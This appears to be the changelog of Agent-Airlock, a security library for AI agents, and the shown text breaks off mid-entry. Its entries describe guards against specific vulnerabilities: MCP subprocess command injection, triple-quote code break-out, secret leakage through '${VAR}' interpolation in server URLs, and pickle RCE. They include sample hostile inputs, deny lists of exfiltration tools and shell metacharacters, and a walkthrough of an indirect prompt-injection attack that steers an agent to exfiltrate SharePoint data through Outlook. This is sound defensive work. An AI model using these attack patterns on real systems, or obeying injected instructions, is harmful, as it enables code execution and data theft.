# Changelog

All notable changes to Agent-Airlock are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

---

## [Unreleased]

_Nothing unreleased — every entry below is a tagged release._

---

## [0.8.22] - 2026-06-11 — "MCP-bridge subprocess command/args/env guard (CVE-2026-42271, CISA KEV)"

### Added — MCP-bridge subprocess-arg injection guard (v0.8.22)

Defensive control for **CVE-2026-42271** (LiteLLM 1.74.2–1.83.6, CVSS
8.7, CWE-78, **added to the CISA Known Exploited Vulnerabilities catalog
on 2026-06-09 — confirmed active exploitation in the wild**): the MCP
server preview endpoints `POST /mcp-rest/test/connection` and
`POST /mcp-rest/test/tools/list` accepted a full MCP server configuration
(stdio-transport `command` / `args` / `env`) in the request body and
spawned it as a subprocess on the proxy host with the proxy's privileges
and **no validation or sandboxing** — any authenticated low-privilege API
key reached arbitrary command execution; chained with CVE-2026-48710
(Starlette Host-header bypass) it becomes unauthenticated RCE. Fixed in
LiteLLM 1.83.7.

- **`agent_airlock.mcp_spec.subprocess_arg_guard.McpSubprocessArgInjectionGuard`**
  — a reusable, CVE-agnostic, **deny-by-default** gate. `evaluate(config)`
  treats a model-/request-controlled MCP-bridge config as untrusted and
  refuses it when it carries spawn-shaped fields (`command` / `cmd` /
  `args` / `argv` / `env`) unless the resolved program (command/cmd, else
  `argv[0]`/`args[0]`, matched by basename or absolute path) is on an
  operator-declared `allowed_commands` allowlist of explicitly-safe
  *static* commands. An empty allowlist (the default) denies every
  spawn-shaped config. An `env` mapping carrying a code-loading variable
  (`LD_PRELOAD` / `LD_LIBRARY_PATH` / `PATH` / `PYTHONPATH` /
  `NODE_OPTIONS` / `BASH_ENV` / ...) is refused regardless of the
  command, since those turn even an allowlisted binary into an execution
  primitive. A config with **no** spawn-shaped fields (a plain data
  argument) passes — this guard gates the spawn surface only. It **never
  spawns anything** — config inspection only. Exposes the standard
  decision family (`McpSubprocessArgDecision.allowed` + a stable verdict
  enum) and carries the advisory / CVE reference in its `fix_hints`;
  `McpSubprocessArgInjectionError` is the raise-form.
- **`policy_presets.mcp_subprocess_arg_injection_guard_defaults(allowed_commands=...)`**
  — wires the guard with the CVE advisory metadata + a `check(config)`
  convenience callable. Canonical `preset_id` /
  `severity="high"` / `default_action="deny"` / `owasp="ASI05"` /
  `cves=("CVE-2026-42271",)` dict, plus a `cisa_kev=True` flag;
  discoverable via `policy_presets.list_active()`. OWASP **ASI05
  Unexpected Code Execution (RCE)** (also MCP05 Command Injection);
  composes one layer above the v0.7.6 `StdioCommandInjectionGuard` (which
  scans an *allowed* argv for shell metachars) — this guard decides
  whether the command may spawn at all.

Pydantic-only core, **no new runtime dependency**. Regression suite:
`tests/cves/test_cve_2026_42271_mcp_subprocess_arg.py` (18 tests) pins the
brief's three core cases (`command="/bin/sh -c ..."` reaching a spawn
blocked, static allowlisted command passes, non-spawn data arg passes)
plus `args`/`argv` program resolution, the `env` code-loading-var vector,
deny-by-default, and preset wiring (including the CISA-KEV flag).

Primary sources: [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-42271),
[The Hacker News](https://thehackernews.com/2026/06/litellm-flaw-cve-2026-42271-exploited.html).

---

## [0.8.21] - 2026-06-09 — "Codegen triple-quote / delimiter break-out guard (CVE-2026-11393)"

### Added — Codegen string-delimiter-injection guard (v0.8.21)

Defensive control for **CVE-2026-11393** (AWS AgentCore CLI < 0.14.2,
CVSS 9, CWE-94, published 2026-06-08): the CLI generates Python source by
interpolating a model-/user-controlled `collaborationInstruction` into a
code string **without neutralising triple-quote characters**, so a
crafted instruction containing `"""` closes the generated literal and
injects statements that execute when another account user imports the
agent — RCE on the AgentCore Runtime (inheriting the agent's IAM role)
and the importer's machine. Patched upstream in 0.14.2.

- **`agent_airlock.mcp_spec.codegen_delimiter_guard.CodegenDelimiterInjectionGuard`**
  — a reusable, CVE-agnostic, **deny-by-default** gate on arguments that
  flow toward a code-generation / template-render / `exec` / `eval`
  sink. `evaluate(args)` accepts a candidate string or a mapping (values
  may nest dicts / lists) and recursively scans for string-delimiter
  break-out tokens:
  - **triple-quote** delimiters (`"""` / `'''`) — the CVE-2026-11393
    primitive,
  - **quote break-out** tokens (a closing quote followed by a statement
    separator / continuation: `");`, `')`, `" +`, `']`, ...),
  - **raw newlines** bound for a single-line code string (toggle via
    `check_newline`).
  Any token denies **unless** the argument's field name is on an
  operator-declared `allowed_literal_fields` allowlist of explicitly safe
  literal contexts. The guard **never generates or executes code** — it
  token-matches the break-out delimiters and refuses, so it carries no
  execution risk itself. Exposes the standard decision family
  (`CodegenDelimiterDecision.allowed` + a stable verdict enum) and
  carries the advisory / CVE reference in its `fix_hints`;
  `CodegenDelimiterInjectionError` is the raise-form.
- **`policy_presets.codegen_delimiter_injection_guard_defaults(allowed_literal_fields=..., check_newline=...)`**
  — wires the guard with the CVE advisory metadata + a `check(args)`
  convenience callable. Canonical `preset_id` /
  `severity="critical"` / `default_action="deny"` / `owasp="ASI05"` /
  `cves=("CVE-2026-11393",)` dict; discoverable via
  `policy_presets.list_active()`. OWASP **ASI05 Unexpected Code Execution
  (RCE)**; composes one layer above the v0.8.0
  `EvalRCEGuard` (which gates the sink itself).

Pydantic-only core, **no new runtime dependency**. Regression suite:
`tests/cves/test_cve_2026_11393_codegen_delimiter.py` (19 tests) pins the
brief's three core cases (`"""` break-out blocked, clean arg passes,
allowlisted literal context passes) plus the other break-out forms,
nested mapping/list scanning, per-field allowlisting, and preset wiring.

Primary sources: [The Hacker Wire](https://www.thehackerwire.com/agentcore-cli-rce-via-triple-quote-neutralization-bypass-cve-2026-11393/),
[CWE-94](https://cwe.mitre.org/data/definitions/94.html).

---

## [0.8.20] - 2026-06-08 — "MCP server-URL env-interpolation secret-leak guard (CVE-2026-32625)"

### Added — MCP server-config env-interpolation guard (v0.8.20)

Defensive control for **CVE-2026-32625** (LibreChat ≤ 0.8.3, CVSS 9.6,
CWE-200, published 2026-06-02): the MCP integration expands `${VAR}`
placeholders in a **user-supplied** MCP server URL against the host
`process.env` during schema validation, so an authenticated user
exfiltrates server-side secrets (`JWT_SECRET` / `CREDS_KEY` /
`MONGO_URI`) by embedding them in a URL that dials an attacker-controlled
host. Patched upstream in 0.8.4-rc1.

- **`agent_airlock.mcp_spec.env_interpolation_guard.MCPServerEnvInterpolationGuard`**
  — a reusable, CVE-agnostic, **deny-by-default** gate on MCP server
  connection configs. `evaluate(config)` accepts a URL string or a
  connection mapping and recursively scans the URL / headers / args for
  env-interpolation tokens in all three forms — `${VAR}` /
  `${VAR:-default}` (POSIX brace), bare `$VAR` (POSIX), and `%VAR%`
  (Windows). Any token is refused unless its variable is on an
  operator-declared `allowed_vars` allowlist of explicitly non-secret
  variables; an empty allowlist (the default) denies every token.
  Escaped (`\$`) and doubled (`$$`) forms are not flagged. The guard
  **never reads `os.environ` and never expands anything** — it
  token-matches and refuses, so it cannot itself leak a secret and
  behaves identically regardless of which variables are set on the host.
  Exposes the standard decision family
  (`MCPEnvInterpolationDecision.allowed` + a stable verdict enum) and
  carries the advisory / CVE reference in its `fix_hints`;
  `MCPServerEnvInterpolationError` is the raise-form for the
  registration / dial-out boundary.
- **`policy_presets.mcp_server_env_interpolation_guard_defaults(allowed_vars=...)`**
  — wires the guard with the CVE advisory metadata and a `check(config)`
  convenience callable. Canonical `preset_id` /
  `severity="critical"` / `default_action="deny"` / `owasp="MCP01"` /
  `cves=("CVE-2026-32625",)` dict; discoverable via
  `policy_presets.list_active()`. OWASP **MCP01 Token Mismanagement and
  Secret Exposure**.

Pydantic-only core, **no new runtime dependency**. Regression suite:
`tests/cves/test_cve_2026_32625_mcp_env_interpolation.py` (18 tests)
pins the brief's three core cases (`${JWT_SECRET}` URL blocked, clean URL
passes, allowlisted non-secret var passes) plus all three token forms,
header/arg scanning, escape handling, per-variable allowlisting, and
preset wiring.

Primary sources: [LibreChat GHSA-6vqg-rgpm-qvf9](https://github.com/danny-avila/LibreChat/security/advisories/GHSA-6vqg-rgpm-qvf9),
[The Hacker Wire](https://www.thehackerwire.com/librechat-critical-credential-disclosure-via-mcp-server-url/).

---

## [0.8.19] - 2026-06-07 — "LeRobot pickle-deserialization RCE guard (CVE-2026-25874)"

### Added — Unsafe-deserialization guard + LeRobot CVE preset (v0.8.19)

Defensive control for **CVE-2026-25874** (HuggingFace LeRobot, CVSS 9.3):
the async-inference PolicyServer / robot-client call `pickle.loads()` on
payloads received over an **unauthenticated, non-TLS** gRPC channel
(`SendObservations` / `SendPolicyInstructions` / `GetActions`), so an
unauthenticated, network-reachable attacker reaches arbitrary OS command
execution by sending a crafted pickle blob.

- **`agent_airlock.safe_types.UnsafeDeserializationGuard`** — a reusable,
  CVE-agnostic content gate on tool-argument **values**, living next to
  the `SafePath` / `SafeURL` CVE-resistant types. Fails closed on:
  - raw pickle magic bytes (`0x80` PROTO opcode + protocol 0–5),
  - base64-encoded pickle (decodes to the same magic),
  - serializer marker tokens in string args (`pickle.loads`,
    `marshal.loads`, `shelve.open`, `dill.loads`, `jsonpickle.decode`,
    `yaml.unsafe_load`, …), and
  - serialized-object (`bytes`) args over an **unauthenticated** channel
    when `require_authenticated_transport=True` — the airgap pairing that
    maps to the CVE's root cause (pickle over an unauthenticated, non-TLS
    transport). The guard never deserializes anything (magic-byte + token
    inspection only); it imports no `pickle`/`marshal`/`dill`.
  Exposes the standard decision family
  (`UnsafeDeserializationDecision.allowed` + a stable verdict enum) and
  carries the advisory / CVE reference in its `fix_hints`.
- **`SecurityPolicy.deserialization_guard`** — a new optional field wired
  into the `@Airlock` pipeline as **Step 2.7** (after the v0.8.15
  action-contradiction gate). When set, a detected payload is blocked
  **before** the tool body runs, returning an `AirlockResponse` whose
  `fix_hints` name **CVE-2026-25874**. `None` by default — tools that
  never deserialize pay no cost.
- **`policy_presets.lerobot_cve_2026_25874_defaults()`** — the per-CVE
  projection: a `SecurityPolicy` with deny-by-name globs
  (`*deserialize*`, `*unpickle*`, `*pickle.loads*`, `torch_load`, and the
  three exploited gRPC method names) **plus** the wired content guard at
  `require_authenticated_transport=True`. Eager constant
  `LEROBOT_CVE_2026_25874_DEFAULTS`; discoverable via
  `policy_presets.list_active()`.

Composes **above** ghost-argument stripping + Pydantic strict
type-validation (which govern argument *shape*); this guard governs
argument *content*. Pydantic-only core, **no new runtime dependency**.
Regression suite: `tests/cves/test_cve_2026_25874_lerobot.py` (29 tests)
sends crafted pickle / base64-pickle / marker payloads through a guarded
`@Airlock` tool and asserts BLOCK + a CVE-naming `fix_hint`, plus the
deny-by-name and transport-airgap axes.

Primary sources: [SentinelOne vuln DB](https://www.sentinelone.com/vulnerability-database/cve-2026-25874/),
[CSA research note](https://labs.cloudsecurityalliance.org/research/csa-research-note-lerobot-cve-2026-25874-unauth-rce-20260429/).

---

## [0.8.18] - 2026-06-06 — "MCP description-vs-manifest consistency guard (DCIChecker)"

### Added — MCP description-vs-manifest consistency guard (v0.8.18)

`agent_airlock.mcp_spec.description_manifest_guard.DescriptionManifestGuard`
— a runtime consistency gate that asserts a tool's **model-facing
description** (its declared input schema + advertised capability /
security boundary) is internally consistent with the tool's
**registered manifest** *before* the tool is admitted, failing closed
per the deny-by-default posture.

Anchored on the DCIChecker study
([arXiv:2606.04769](https://arxiv.org/abs/2606.04769)), which measured
**Description-Code Inconsistency at 9.93% of 19,200 tool
description/implementation pairs across 2,214 MCP servers** — the
description a model consumes does not match the tool's actual contract
roughly 1 call in 10.

The guard detects three divergence classes:

- `described_arg_not_in_manifest` — the description advertises an
  argument the manifest never declares (a model following the
  description faithfully would invent a ghost argument).
- `undisclosed_side_effect` — the manifest declares a side effect /
  capability the description does not disclose (the under-disclosure /
  tool-poisoning direction).
- `overclaimed_capability` — the description advertises a capability
  absent from the manifest.

A manifest arg the description omits is intentionally **not** flagged:
benign under-documentation of an input is governed by the ghost-arg /
Pydantic layer at call time, not by this semantic guard.

This composes **above** the existing ghost-argument stripping
(`unknown_args`) and Pydantic strict type-validation (`validator`):
those govern the observed call payload, while this guard asserts the
declared contract itself is honest. It does **not** replace them.

Three drift modes mirror the v0.8.1 `OpenAPIDriftGuard`: `strict`
(default — deny on any inconsistency), `warn` (allow + structured log),
`shadow` (allow + record, no log). `vaccinate_description_manifest(manifests)`
returns a wrap-seam decorator that raises `DescriptionManifestViolation`
**before** the underlying tool executes; the violation carries the
decision and LLM-actionable `fix_hints`. Inputs (`ToolManifest`,
`ToolDescription`) are caller-supplied — agent-airlock imports no MCP
SDK and adds no runtime dependency (Pydantic-only core).

**Preset:** `mcp_description_manifest_guard_defaults(manifests=..., drift_mode=...)`
returns the canonical `preset_id` / `severity` / `default_action` /
`advisory_url` dict plus a pre-built `guard` and a `check(description)`
convenience callable. OWASP **MCP03 Tool Poisoning**; composes with
`owasp_mcp_top_10_2026_policy`. Discoverable via `policy_presets.list_active()`.

---

## [0.8.17] - 2026-06-05 — "Adversarial-negotiation regression harness"

### Added — Adversarial-negotiation regression harness (v0.8.17)

`agent_airlock.negotiation_bench` — a deterministic regression harness
that benchmarks the deny-by-default governance layer on a fixed set of
adversarial buyer-seller negotiation actions, reporting two metrics
named to line up with the external OCL paper:

- `unsafe_execution_rate` — fraction of adversarial scenarios whose
  unsafe action actually executed.
- `valid_task_success_rate` — fraction of valid (policy-compliant)
  tasks that completed.

Each scenario carries a **concrete, checkable unsafe action** and is
run twice: **baseline** (no airlock — the unsafe event lands) and
**governed** (the *same* action routed through the **real** `@Airlock`
intercept-before-execute path — no policy-layer mocking). Three
unsafe-action classes each exercise a different real interception
mechanism:

- `PRICE_BELOW_FLOOR` → Pydantic strict-validation (a constrained
  `amount` field rejects below-floor values).
- `SECRET_LEAK` → the output sanitizer (the secret is masked before it
  leaves the boundary).
- `TRANSFER_OUTSIDE_POLICY` → deny-by-default `SecurityPolicy` (the
  out-of-allowlist tool name is blocked).

Benign scenarios are included so the harness also measures that
governance does **not** over-block legitimate deals. On the default
scenario set the harness reports baseline `unsafe_execution_rate` 100% →
governed **0%**, and governed `valid_task_success_rate` **100%** — a
**regression gate**: weaken the policy layer and governed unsafe rate
rises above zero (or valid-success drops below one) and the test fails.

**External comparison baseline — clearly labeled, NOT airlock's.**
The harness records the OCL paper's headline numbers
([arXiv:2606.04306](https://arxiv.org/abs/2606.04306),
"Organizational Control Layer", evaluated on AgenticPay-adapted
negotiation,
[arXiv:2602.06008](https://arxiv.org/abs/2602.06008)) as a labeled
comparison row: unsafe executions **88% → near-zero**, valid success
**12% → 96%**. These are **external** results measured on **live frontier
LLM agents** and are **not** an agent-airlock measurement. agent-airlock
is a deterministic execution-boundary validator, not an LLM; the harness
does not call a model. The OCL row is shown only for directional
comparison (both put governance at the execution boundary), with that
distinction stated in the module docstring, the `OCL_EXTERNAL_BASELINE`
note field, and the rendered report.

**CLI:** `python -m agent_airlock.cli.negotiation_bench --report
{text,json,markdown}`. The `markdown` mode emits a blog-pasteable table
(scenario, baseline/governed unsafe%, baseline/governed success%) with
the agent-airlock rows next to the labeled OCL row. A
`--fail-if-governed-unsafe` flag turns the harness into a CI regression
gate. structlog diagnostics are routed to stderr so stdout stays clean
for `| jq` (mirrors `cli/corpus_bench`).

Surfaces:

- `agent_airlock.negotiation_bench` — `run_benchmark()`,
  `BenchmarkReport`, `ScenarioRun`, `NegotiationScenario`,
  `UnsafeActionKind`, `DEFAULT_SCENARIOS`, `OCL_EXTERNAL_BASELINE`,
  `OCLExternalBaseline`.
- `agent_airlock.cli.negotiation_bench` — `main(argv)` CLI.

Tests: 25 in `tests/test_negotiation_bench.py` — the regression-gate
guarantee (governed unsafe 0.0 / valid-success 1.0, baseline unsafe
1.0), per-mechanism coverage (price / secret / transfer each block when
governed and land at baseline), benign-not-over-blocked, the real-path
assertion (the governed price run actually hits the `@Airlock`
validator), external-baseline labeling, JSON/markdown/text CLI render,
the CI gate flag, and edge cases (kind=None and custom-floor mismatch
raise).

Version bump 0.8.16 → 0.8.17 (additive harness + CLI; no API break;
zero new runtime deps).

---

## [0.8.16] - 2026-06-04 — "Flowise MCP-stdio adapter RCE preset (CVE-2026-40933)"

### Added — Flowise MCP-stdio adapter RCE preset (v0.8.16, CVE-2026-40933)

`flowise_mcp_stdio_guard_2026_defaults()` — a per-CVE preset for the
Flowise authenticated-RCE-via-MCP-stdio-adapter class
([CVE-2026-40933](https://advisories.gitlab.com/npm/flowise-components/CVE-2026-40933/),
CVSS 9.9, fixed upstream in Flowise 3.1.0).

Flowise ≤ 3.0.x lets an authenticated user define a CustomMCP server
with the **stdio** transport, supplying an arbitrary `command` + `args`
that Flowise serialises straight into a child-process spawn on the
server — no sandbox, no argv sanitisation. Importing a crafted chatflow
is a one-click path to OS-level RCE with the Flowise process's
privileges (often root in containers). Advisory excerpt: *"Due to
unsafe serialization of stdio commands in the MCP adapter, an
authenticated attacker can add an MCP stdio server with an arbitrary
command, achieving command execution."*

**Honest framing — no new detector.** The preset is a per-tool-class
projection of the existing v0.7.6
`agent_airlock.mcp_spec.stdio_command_injection_guard.StdioCommandInjectionGuard`
(the same primitive `mcp_stdio_command_injection_preset_defaults` wires),
scoped to the Flowise CustomMCP stdio tool-name surface (`customMCP`,
`custom_mcp`, `mcp_stdio`, `stdio_mcp`, `flowise_mcp`,
`mcp_server_stdio`). It uses the established per-CVE preset registration
shape (a `dict[str, Any]` with `preset_id` / `severity` /
`default_action` / `advisory_url` / `cves` / config knobs) — no new
registration mechanism invented — and is discoverable via
`policy_presets.list_active()`.

Fail-closed posture:

- Shell-metachar / unsanitised-arg construction in the stdio command
  path (`command` field OR any `args` element) → blocked
  (`deny_shell_metachar`). Default metachar set is the v0.7.6
  `;`, `&&`, `||`, `|`, newline, carriage return, backtick, `$(`;
  extend via `extra_metachars`.
- Path traversal outside an operator-supplied `cwd_allowlist` →
  blocked (`deny_path_traversal`; opt-in, empty allowlist disables it).
- The `check(args)` convenience callable raises
  `FlowiseMcpStdioInjectionError` (an `AirlockError` subclass carrying
  the verdict + matched token) on a denied argv shape, returns `None`
  on a benign one.

OWASP mapping: **MCP05 Command Injection** (OWASP MCP Top-10 2026,
beta).

**Fixes a prior mis-attribution.** `ox_mcp_supply_chain_2026_04_defaults()`
and `docs/presets/ox-mcp-supply-chain-2026-04.md` previously recorded
CVE-2026-40933 as a *"Semantic Kernel MCP auth-header leak"* covered by
`header_audit` — a factual error (no such CVE exists; CVE-2026-40933 is
the Flowise stdio RCE). This release corrects both: the Ox bundle now
exposes a `flowise_stdio_check` callable backed by the new guard, so
CVE-2026-40933 is covered by the correct primitive, and the doc table
row is fixed.

Surfaces:

- `agent_airlock.policy_presets.flowise_mcp_stdio_guard_2026_defaults(*, cwd_allowlist=(), extra_metachars=frozenset(), extra_tool_name_patterns=())`
  — the factory; `preset_id="flowise_mcp_stdio_guard_2026"`.
- `agent_airlock.policy_presets.FlowiseMcpStdioInjectionError`
  — `AirlockError` subclass with `verdict` / `matched_metachar` /
  `matched_path` attributes.
- `ox_mcp_supply_chain_2026_04_defaults()["flowise_stdio_check"]`
  — the corrected coverage wiring.

Tests: 24 in `tests/cves/test_cve_2026_40933_flowise_mcp_stdio.py` —
benign argv admitted (incl. no-args + `None` payload), 6 parametrized
malicious metachar shapes blocked with the expected verdict + matched
token, path-traversal blocked with `cwd_allowlist` (and within-allowlist
admitted), `extra_metachars` extension, the canonical preset-shape keys,
`composes` provenance, tool-name-pattern coverage + extension, type
validation, `list_active` discovery, and the Ox-bundle correction
(wires `flowise_stdio_check`, blocks injection, admits benign, CVE still
listed).

Version bump 0.8.15 → 0.8.16 (additive per-CVE preset + drive-by
mis-attribution fix; no API break; zero new runtime deps).

---

## [0.8.15] - 2026-06-03 — "Action-time contradiction gate (arXiv:2605.27157)"

### Added — Action-time contradiction gate (v0.8.15, arXiv:2605.27157)

`ActionContradictionGate` — an opt-in, off-by-default policy hook that
gates privileged / irreversible actions when the session has signalled
acknowledged-contradiction evidence. Closes the "detecting is not
resolving" monitoring-control gap reported by Yu et al.,
[*Detecting Is Not Resolving: The Monitoring Control Gap in
Retrieval Augmented LLMs*](https://arxiv.org/abs/2605.27157) (2026):
*"Models exhibit a monitoring-control gap: they readily acknowledge
contradictory evidence, yet this awareness fails to constrain their
final recommendations."* The paper localises the deficit at action
selection; this module is the action-time control.

**Three pluggable, orthogonal detectors** (any one trips the gate):

- `signal_field_key`: a key into `AirlockContext.metadata`; the gate
  trips iff the value at that key is **strict `True`** (the
  unambiguous boolean-flag shape).
- `marker_regex`: a pre-compiled regex run against the value at the
  same key **when that value is a string** (operator's narrative
  marker shape). Reads only operator-supplied marker strings — never
  the model's full reasoning trace.
- `predicate`: a fully pluggable `Callable[[AirlockContext], bool]`.
  A predicate that raises is swallowed (the gate logs
  `predicate_error` and treats as no-vote — telemetry never breaks
  enforcement).

**Privileged-sink glob set.** Default canonical set covers send /
publish / dispatch (`send_*`, `publish_*`, `post_to_*`, `webhook_*`,
`dispatch_*`), export / share / upload (`export_*`, `share_*`,
`upload_*`), state-mutating commits and transfers (`commit_*`,
`transfer_*`, `wire_*`, `pay_*`, `create_payment_*`), irreversible
deletes (`delete_*`, `drop_*`, `destroy_*`, `purge_*`), and the
v0.8.14 outbound-integration set (`outlook_*`, `smtp_*`,
`salesforce_send_email`, `create_case`, `create_lead`). Operators can
narrow via `privileged_sinks=(...)`.

**Explicit-allow primitive reused, not duplicated.** The gate's
allow path is the existing `AirlockContext.authorize_once(tool_name)`
introduced for the v0.8.6 reauth flow. After a one-shot is consumed
the gate **re-locks** (sticky-trip invariant) — the harness must mint
a fresh `authorize_once` for each privileged action.

**Off-by-default invariant.** `SecurityPolicy.action_contradiction_gate`
defaults to `None`; non-RAG flows pay **zero false-positive tax** (no
detector runs, no log lines, no metadata reads). Even when wired, the
gate is **inert until at least one detector is configured** — a
partial roll-out (gate attached but detectors flipped off) admits
everything.

**Fail-closed `action`.** `action="block"` (default) raises
`ActionContradictionViolation` — a `PolicyViolation` subclass, so the
existing `handle_policy_violation` chain in `core.py` picks it up
unchanged. `action="warn"` logs via structlog + admits, for staged
turn-up against real traffic.

Disambiguation:

- **Not** `agent_airlock.sequence_guard.SequenceGuard` (v0.8.12) —
  that flags unusual call **order**.
- **Not** `SecurityPolicy.reauth_on_untrusted_reinvocation` (v0.8.6)
  — that's **count-driven** on a per-tool counter once any untrusted
  output has flowed back.
- This gate is **signal-driven** and targets a specific **privileged-
  sink glob set**. The three compose; run all three for layered
  coverage.

Surfaces:

- `agent_airlock.action_contradiction_gate` — new module:
  - `ActionContradictionGate` (`@dataclass`, thread-safe,
    `threading.Lock`-protected sticky state).
  - `ActionContradictionViolation(PolicyViolation)`.
  - `DEFAULT_PRIVILEGED_SINKS: tuple[str, ...]` — the canonical set.
  - `ContradictionGateAction = Literal["block", "warn"]`.
- `agent_airlock.policy.SecurityPolicy.action_contradiction_gate:
  ActionContradictionGate | None = None` — new optional field;
  default `None` preserves v0.8.14 behavior exactly.
- `agent_airlock.core.Airlock._check_action_contradiction_gate(...)`
  — new private **Step 2.6** in the `@Airlock` pre-execution
  pipeline. Runs right after the v0.8.12 sequence-guard hook (Step
  2.5) so a transition-blocked tool never advances the
  contradiction state.

Tests: 53 in `tests/test_action_contradiction_gate.py` covering
construction validation (action / privileged_sinks /
no-detectors-inert), all 3 detector kinds (incl. predicate-raise
swallowed + any-detector-trips), 22 default privileged-sink globs
parametrized blocked when tripped, 4 non-sink tools admitted under
tripped state, operator override of `privileged_sinks`,
authorize_once one-shot flow, sticky-trip invariant after one-shot
consumed, per-tool grant isolation, warn vs block, reset
(per-session + global), exception payload shape (subclass of
`PolicyViolation`, audit-friendly `details`), thread safety (20
concurrent calls all blocked), and `@Airlock` end-to-end (privileged
sink blocked via the positional-context-wrapper pattern, non-sink
admitted under contradiction, clean session admits).

Smoke

`scripts/smoke_action_contradiction_gate.py` builds the wheel,
installs into a fresh venv with **no extras**, imports the gate from
the *installed* package, simulates an "acknowledged contradiction"
trace by passing a `RunContextWrapper`-shaped wrapper carrying
`metadata={"evidence_contradiction": True}`, asserts a dummy
`send_email` tool returns a blocked `AirlockResponse`, asserts a
dummy `read_kb` (non-sink) is admitted, asserts a clean session
(`evidence_contradiction=False`) admits the privileged tool, and
asserts `__version__ == "0.8.15"` on the installed package.

Version bump 0.8.14 → 0.8.15 (additive new module + additive
optional `SecurityPolicy` field; no API break; zero new runtime
deps).

---

## [0.8.14] - 2026-06-01 — "Capsule ShareLeak / PipeLeak preset (CVE-2026-21520)"

### Added — Capsule ShareLeak / PipeLeak preset (v0.8.14, CVE-2026-21520)

`capsule_indirect_injection_cve_2026_21520_defaults()` — a deny-by-
default preset for the
[Capsule Security](https://www.capsulesecurity.io/blog-post/shareleak-taking-the-wheel-of-microsofts-copilot-studio-cve-2026-21520)-disclosed
indirect-prompt-injection class:

- **ShareLeak — [CVE-2026-21520](https://nvd.nist.gov/vuln/detail/CVE-2026-21520)**
  (CVSS v3.1 7.5 HIGH, CWE-77, Microsoft Copilot Studio, patched
  2026-01-15, published 2026-01-22). NVD verbatim: *"Exposure of
  Sensitive Information to an Unauthorized Actor in Copilot Studio
  allows a unauthenticated attacker to view sensitive information
  through network attack vector"*. Capsule's named scenario:
  untrusted SharePoint form fields are concatenated into the agent
  system prompt with no input sanitisation; the agent then queries
  SharePoint and exfiltrates via Outlook.
- **PipeLeak** — Capsule's name for the parallel vulnerability in
  Salesforce Agentforce. No separate CVE in public NVD; same
  architectural pattern targeting Web-to-Lead form inputs with
  outbound case / lead / email actions.

**Architectural pattern.** Untrusted form input → agent context (no
boundary) → agent holds simultaneous access to (a) the untrusted
content and (b) outbound exfil tools → injected instructions steer
the agent to query a sensitive data source and exfiltrate via the
outbound tool. Patching the prompt-injection input alone does not
close the gap.

**Defence.** The preset composes existing agent-airlock primitives —
**no new validator invented**:

- `SecurityPolicy(default_deny=True, allowed_tools=())` — empty
  allow-list under default_deny means nothing is callable; operators
  opt every read-side tool in by name (pairs with
  `airlock-explain --unused-scopes` v0.8.13 for trace-driven
  allow-list authoring).
- `denied_tools` — the canonical exfil-sink glob set across Copilot
  Studio / Outlook (`send_email`, `outlook_*`, `smtp_*`), Salesforce
  Agentforce (`create_case`, `create_lead`, `post_to_chatter`,
  `salesforce_send_email`), and generic agentic sinks (`share_*`,
  `export_*`, `post_to_*`, `webhook_*`, `publish_*`, `upload_*`,
  `external_*`, `http_request`, `http_post`, `fetch_url`).
  Deny-list precedence — even with an operator-set read-side
  allow-list, exfil sinks remain DENIED.
- `reauth_on_untrusted_reinvocation=True` +
  `untrusted_reinvocation_threshold=1` — the v0.8.6 debate-
  amplification guard at its strictest setting. Any tool
  reinvocation within a context whose origin includes untrusted
  tool output requires a fresh `authorize_once()` grant on the
  `AirlockContext`.
- `AirlockConfig(unknown_args=UnknownArgsMode.BLOCK)` — closes the
  smuggle-a-hallucinated-arg-past-the-validator escape hatch.

**Surfaces:**

- `agent_airlock.policy_presets.capsule_indirect_injection_cve_2026_21520_defaults(*, extra_denied_tools=(), allowed_tools=()) -> dict[str, Any]`
  — the factory. Discoverable via `policy_presets.list_active()`.
- `agent_airlock.policy_presets.CAPSULE_INDIRECT_INJECTION_CVE_2026_21520_DEFAULTS`
  — the eagerly-constructed default singleton (canonical posture, no
  operator extensions).
- Both re-exported from the top-level `agent_airlock` namespace.

**Diff-compatibility.** Strictly opt-in. Not added to any default
priority chain. Callers that don't construct the preset see exactly
v0.8.13 behavior.

**Tests.** 39 new tests under
`tests/cves/test_cve_2026_21520_capsule_indirect_injection.py` cover
structure (NVD source / Capsule blog link / canonical corpus / both
the ShareLeak and PipeLeak tool-name surfaces),
posture (`default_deny=True`, empty `allowed_tools`,
`reauth_on_untrusted_reinvocation` at the strictest setting,
`UnknownArgsMode.BLOCK`), parametrized denial across all 19
canonical exfil sinks under default-only AND with read-side
allow-list set (deny-list precedence), operator extensions
(`extra_denied_tools`, fresh factory instances no aliasing), and
end-to-end `@Airlock` admit + block (read tool admitted, exfil
returns a blocked `AirlockResponse`).

**Version housekeeping (drift fix).** `src/agent_airlock/__init__.py`
`__version__` was stale at `"0.8.9"` (4 versions behind
`pyproject.toml = "0.8.13"`). Aligned to `"0.8.14"` in this PR.

Version bump 0.8.13 → 0.8.14 (additive preset; no API break; zero
new runtime deps).

---

## [0.8.13] - 2026-05-31 — "`airlock explain --unused-scopes` privilege right-sizing"

### Added — `airlock-explain --unused-scopes` privilege right-sizing reporter (v0.8.13)

`airlock-explain` — a new **read-only** CLI that surfaces
over-permissioning by diffing `SecurityPolicy.allowed_tools` (granted
scopes) against the tools an agent actually called (extracted from a
run trace), per `AgentIdentity`. Prints, per agent: granted-but-never-
used scopes (the dead-weight set), the observed tool set, and (with
`--suggest-policy`) a *proposed* tightened allow-list as a stdout
preview.

```bash
pip install "agent-airlock>=0.8.13"
airlock-explain --unused-scopes \
    --policy ./security-policy.toml \
    --trace  ./agent.audit.jsonl \
    --format json \
    --suggest-policy
```

**Read-only contract.** This command **never** mutates a
`SecurityPolicy`, **never** writes the policy file, and **never**
installs itself into the deny-by-default enforcement path. The
`--suggest-policy` output is intentionally a stdout preview so a human
reviews the tightened allow-list before adopting it by hand. A
regression test (`test_read_only_contract_policy_file_unchanged`)
asserts byte-equality of the policy file before and after a
`--suggest-policy` run.

**Trace formats** — auto-detected by inspecting the file head:

- **Audit JSONL** — the format `agent_airlock.audit.AuditLogger` already
  emits. Lines starting with `#` are header-skipped; lines with
  `blocked: true` are excluded (a blocked call is not an exercise of
  a granted scope); missing `agent_id` falls back to `__anonymous__`.
- **OTLP JSON** — the format `opentelemetry-exporter-otlp` writes
